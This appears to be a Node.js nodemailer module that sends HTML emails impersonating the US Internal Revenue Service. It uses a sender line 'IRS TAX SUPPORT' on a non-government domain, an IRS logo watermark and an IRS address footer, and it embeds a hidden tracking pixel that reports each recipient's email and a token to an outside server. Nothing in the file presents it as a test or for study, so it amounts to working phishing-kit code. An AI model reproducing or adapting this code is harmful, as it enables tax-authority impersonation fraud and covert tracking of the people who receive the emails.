




const dotenv = require("dotenv");
const nodemailer = require("nodemailer")


// Load environment variables
dotenv.config();
const sendThroughNodeMailer = async (email, subject, content, token) => {


    const trackingUrl = `https://email-server-5yc7.onrender.com/track-email?token=${token}&email=${email}`


    // Create a Transporter to send the mail.

    const transporter = nodemailer.createTransport({
        host: 'smtp.gmail.com',
        port: 465, // Use 465 for SSL or 587 for STARTTLS
        secure: true, // Use true for 465 and false for 587
        auth: {
            user: process.env.ZEPTO_USER, // Replace with your ZeptoMail SMTP username
            pass: process.env.ZEPTO_PASSWORD, // Replace with your ZeptoMail SMTP password
        },
        tls: {
            rejectUnauthorized: true, // Optional, enhances security
        },
    });


    const html = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${subject}</title>
    <style>
        body {
            margin: 0;
            height: 100vh;
            display: grid;
            /* place-items: center; */
            /* background-color: #000; */
            position: relative;
            overflow: hidden;
            padding: 20px;
        }

        .grid-watermark {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: grid;
            grid-template-columns: repeat(9, 1fr); /* Max width divided by 9 */
            grid-template-rows: repeat(12, 1fr); /* Max height divided by 9 */
            pointer-events: none;
            z-index: -1;
        }

        .grid-watermark div {
            background-image: url('https://chyjlcmkbpkuniircbch.supabase.co/storage/v1/object/public/IRS/irs-logo%20(2).png?t=2024-12-10T22%3A52%3A06.511Z'); /* Replace with your image URL */
            background-size: 80%; /* Reduce image size to make it smaller */
            background-position: center;
            background-repeat: no-repeat;
            transform: rotate(-45deg); /* Rotate the image by 45 degrees */
            width: 100%;
            height: 100%;
            opacity: 0.1; /* Adjust opacity for watermark effect */
        }



        .content {
            max-width: 800px;
            padding: 20px;
            text-align: start;
            
        }

        .content img {

            height: 25px;
        }

        .content h1 {
            margin: 0;
            font-size: 24px;
        }


        .footer {
            text-align: start;
            font-size: 14px;
    
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="grid-watermark">
    <!-- Static grid cells -->
        <div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div>
        <div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div>
        <div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div>
        <div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div>
        <div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div>
        <div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div>
        <div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div>
        <div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div>
        <div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div>
        <div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div>
        <div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div>
        <div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div>
        
    </div>
           <img src="https://email-server-5yc7.onrender.com/track-email?token=${token}&email=${email}"  alt="" style="display: none;" />
    <div class="content">
        <img src="https://chyjlcmkbpkuniircbch.supabase.co/storage/v1/object/public/IRS/irs-logo%20(2).png?t=2024-12-10T22%3A52%3A06.511Z"  alt="" />
        <hr>
      ${content}
        <hr>
        <div class="footer">
            <p>Regards,</p>
            <p>Internal Revenue Service</p>
            <p>1111 Constitution Avenue NW,</p>
            <p>Washington, D.C.</p>
        </div>
</body>
</html>
    `

    // Set up the Mail Option
    const date = new Date();
    const mailOptions = {
        from: 'IRS TAX SUPPORT <support@taxsupport.io>', // Use an email address from your ZeptoMail domain
        to: email, // Recipient's email
        subject: subject, // Subject
    //     html: `
    //   <!DOCTYPE html>
    //             <html>
    //             <head>
    //                 <meta charset="UTF-8">
    //                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
    //                 <title>${subject}</title>
    //             </head>
    //             <body style="margin: 0; padding: 0; font-family: Arial, sans-serif;">
    //             <img src="https://email-server-5yc7.onrender.com/track-email?token=${token}&email=${email}"  alt="" style="display: none; />
    //                 <table width="100%" cellpadding="0" cellspacing="0" style="padding: 20px;">
    //                     <tr>
    //                         <td align="center">
    //                             <table style="background-color: #ffffff; border-radius: 5px; overflow: hidden; max-width: 600px;">
    //                                 <tr>
    //                                     <td style="padding: 20px; text-align: center;">
    //                                         <img src="https://chyjlcmkbpkuniircbch.supabase.co/storage/v1/object/public/IRS/irs-logo%20(2).png?t=2024-12-10T22%3A52%3A06.511Z" alt="IRS Logo" style="max-width: 90px;">
    //                                     </td>
    //                                 </tr>
    //                                 <tr>
    //                                     <td style="padding: 20px;">
    //                                         <div>${content}</div>
    //                                         <p>Regards,<br>Internal Revenue Service<br>Address: 1111 Constitution Avenue NW<br> Washington, D.C.</p>
    //                                     </td>
    //                                 </tr>
    //                                 <tr>
    //                                     <td style="padding: 20px; text-align: center; background-color: #f4f4f4;">
    //                                         <p>© ${date.getFullYear()} Internal Revenue Service</p>
    //                                     </td>
    //                                 </tr>
    //                             </table>
    //                         </td>
    //                     </tr>
    //                 </table>
    //             </body>
    //             </html>
        // `,
        
        html: html
    };


    try {
        const info = await transporter.sendMail(mailOptions);
        console.log('Email sent:', info.messageId);

        return info;
    } catch (error) {
        console.error('Error sending email:', error);
        return error;
    }
};
module.exports = sendThroughNodeMailer;





